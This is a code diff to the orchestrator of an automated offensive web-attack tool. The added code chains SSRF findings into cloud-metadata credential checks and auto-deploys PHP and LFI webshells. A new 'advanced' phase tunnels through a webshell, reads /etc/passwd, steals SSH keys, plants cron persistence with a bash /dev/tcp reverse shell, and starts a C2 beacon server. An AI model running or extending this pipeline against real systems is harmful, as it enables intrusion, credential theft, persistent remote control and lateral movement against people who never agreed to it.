-                    result["ssrf_lateral"] = ssrf_lateral.run(url, param, sess=raw_sess, timeout=self.timeout)
+                    lat = ssrf_lateral.run(url, param, sess=raw_sess, timeout=self.timeout)
+                    result["ssrf_lateral"] = lat
                     result["ssrf_pwn"] = ssrf_lateral.check(url, param, sess=raw_sess, timeout=self.timeout)
+                    cloud_meta = lat.get("cloud_metadata", {})
+                    if cloud_meta:
+                        meta_text = json.dumps(cloud_meta)
+                        from tools.cloud_pwn import check as cloud_check
+                        c_result = cloud_check(meta_text)
+                        if c_result.get("success"):
+                            result["cloud_pwn"] = c_result
+                            result["exploit_ready"] = True
                 except Exception as e:
                     logger.debug("ssrf weaponize: %s", e)
 
@@ -1050,6 +1543,22 @@ class Orchestrator:
                 if v.get("rce_available"):
                     result["rce"] = True
                     result["exploit_ready"] = True
+                    try:
+                        from tools.reverse_shell import deploy_webshell
+                        ws = deploy_webshell(url, webshell_type="php_cmd",
+                                           sess=raw_sess, timeout=self.timeout)
+                        if ws.get("success"):
+                            result["webshell"] = ws
+                    except Exception as e:
+                        logger.debug("webshell deploy: %s", e)
+
+                from tools.weaponize_engine import deploy_webshell_lfi
+                lfi_ws = deploy_webshell_lfi(url, param, raw_sess, self.timeout)
+                if lfi_ws.get("success"):
+                    result["lfi_webshell"] = lfi_ws
+                    result["exploit_ready"] = True
+                    result["webshell"] = result.get("webshell", {})
+                    result["webshell"]["lfi_auto"] = lfi_ws
 
             if vtype == "xss":
                 try:
@@ -1096,7 +1605,79 @@ class Orchestrator:
             exploits["auth_bypass"] = {"total": len(auth_findings), "findings": auth_findings, "exploit_ready": True}
 
         self.state["phases"]["weaponize"] = exploits
+        self._save_phase("weaponize")
         return exploits
+
+    def phase_advanced(self, exploits: Dict) -> Dict:
+        result = {"tunnels": [], "c2_active": False, "ssh_keys": [], "post_exploit": False}
+        webshell_urls = []
+        for k, v in exploits.items():
+            for subkey in ("webshell", "sqli_webshell", "lfi_webshell"):
+                sub = v.get(subkey, {})
+                if isinstance(sub, dict) and sub.get("webshell_url"):
+                    webshell_urls.append(sub["webshell_url"])
+
+        if webshell_urls:
+            from tools.tunnel_agent import chisel_tunnel, socks5_over_webshell
+            ws_url = webshell_urls[0]
+            print("  [Advanced] Deploying SOCKS5 tunnel via webshell ...")
+            tunnel = socks5_over_webshell(ws_url)
+            if tunnel["success"]:
+                result["tunnels"].append(tunnel)
+                cmds = tunnel.get("deploy_commands", [])
+                for cmd in cmds[:1]:
+                    try:
+                        r = self.sess.get(ws_url, params={"c": cmd}, timeout=10)
+                        if r.status_code == 200:
+                            logger.info("Tunnel cmd sent: %s...", cmd[:60])
+                    except Exception:
+                        pass
+            chisel = chisel_tunnel(self.target)
+            if chisel["success"]:
+                result["chisel_tunnel"] = chisel
+
+            from tools.interactive_shell import PTYShell
+            def _exec_cmd(c):
+                try:
+                    r = self.sess.get(ws_url, params={"c": c}, timeout=10)
+                    return {"success": r.status_code == 200, "output": r.text[:2000]}
+                except Exception as e:
+                    return {"success": False, "error": str(e)}
+
+            pty = PTYShell(_exec_cmd)
+            upg = pty.upgrade()
+            if upg["success"]:
+                result["pty_upgrade"] = upg
+            enum_r = pty._run("hostname;id;whoami;cat /etc/passwd 2>/dev/null | head -5;ifconfig 2>/dev/null | head -3 || ip addr 2>/dev/null | head -3")
+            if enum_r:
+                result["enum_output"] = enum_r[:500] if isinstance(enum_r, str) else str(enum_r.get("output", ""))[:500]
+
+            from tools.lateral_move import steal_ssh_keys
+            ssh_keys = steal_ssh_keys(_exec_cmd)
+            if ssh_keys.get("success"):
+                result["ssh_keys"] = ssh_keys["keys"]
+                print("    -> %d SSH keys stolen" % len(ssh_keys["keys"]))
+
+            from tools.post_exploit import cron_persistence, webshell_persistence
+            persist_ws = webshell_persistence(ws_url)
+            persist_cron = cron_persistence("bash -c 'exec 5<>/dev/tcp/%s/4444;cat<&5|while read l;do $l 2>&5>&5;done' &" % self.target)
+            result["post_exploit"] = {
+                "webshell_hidden": persist_ws["paths"],
+                "cron_job": persist_cron.get("cron_line"),
+            }
+
+        from tools.c2_beacon import C2Server
+        try:
+            c2 = C2Server(bind_port=9999)
+            c2.start()
+            result["c2"] = {"port": 9999, "agents_endpoint": "/beacon"}
+            result["c2_active"] = True
+        except Exception as e:
+            logger.debug("c2 start: %s", e)
+
+        self.state["phases"]["advanced"] = result
+        self._save_phase("advanced")
+        return result
 
     def phase_report(self) -> Dict:
         report = {
@@ -1184,6 +1765,17 @@ class Orchestrator:
         )
 
         self.state["phases"]["report"] = report
+        self._save_phase("report")
+        if self._storage:
+            try:
+                cur = self._storage._conn.cursor()
+                cur.execute(
+                    "UPDATE sessions SET report=?, updated_at=? WHERE id=?",
+                    (json.dumps(report), time.time(), self._storage.session_id())
+                )
+                self._storage._conn.commit()
+            except Exception as e:
+                logger.debug("save report: %s", e)
         return report
 
     def run(self) -> Dict:
@@ -1250,6 +1842,9 @@ class Orchestrator:
         by_type_str = " ".join("[%s:%d]" % (k.upper(), v) for k, v in sorted(by_type.items()))
         print("  -> %d vulnerabilities found: %s" % (len(findings), by_type_str))
 
+        print("[*] Phase 5b/7: Deep response intelligence gathering ...")
+        self.phase_ai_hunt()
+
         print("[*] Phase 6/7: Attack chain pivoting ...")
         pivot_result = self.phase_pivot()
         pivot_actions = len(pivot_result.get("pivot_actions", []))
@@ -1267,6 +1862,18 @@ class Orchestrator:
             ex_ready = len([e for e in exploits.values() if e.get("exploit_ready")])
             print("  -> %d exploit paths (%d ready)" % (len(exploits), ex_ready))
 
+        if exploits:
+            print("[*] Phase 8/7: Advanced exploitation (tunnel/C2/lateral) ...")
+            adv = self.phase_advanced(exploits)
+            if adv.get("tunnels"):
+                print("  -> %d tunnel agents deployed" % len(adv["tunnels"]))
+            if adv.get("c2_active"):
+                print("  -> C2 beacon agent active")
+            if adv.get("ssh_keys"):
+                print("  -> %d SSH keys stolen" % len(adv["ssh_keys"]))
+            if adv.get("post_exploit"):
+                print("  -> Post-exploitation persistence generated")
+
         report = self.phase_report()
         self.oob_server.stop()
         report["elapsed_seconds"] = round(time.time() - start, 1)
@@ -1277,8 +1884,9 @@ class Orchestrator:
 def run(target: str, sess: Optional['requests.Session'] = None,
         timeout: float = 10.0, threads: int = 10,
         high_priv_sess: Optional['requests.Session'] = None,
-        fast_recon: bool = True, time_budget: Optional[float] = None) -> Dict:
+        fast_recon: bool = True, time_budget: Optional[float] = None,
+        high_value: bool = False) -> Dict:
     o = Orchestrator(target, sess, timeout, threads,
                      high_priv_sess=high_priv_sess, fast_recon=fast_recon,
-                     time_budget=time_budget)
+                     time_budget=time_budget, high_value=high_value)
     return o.run()
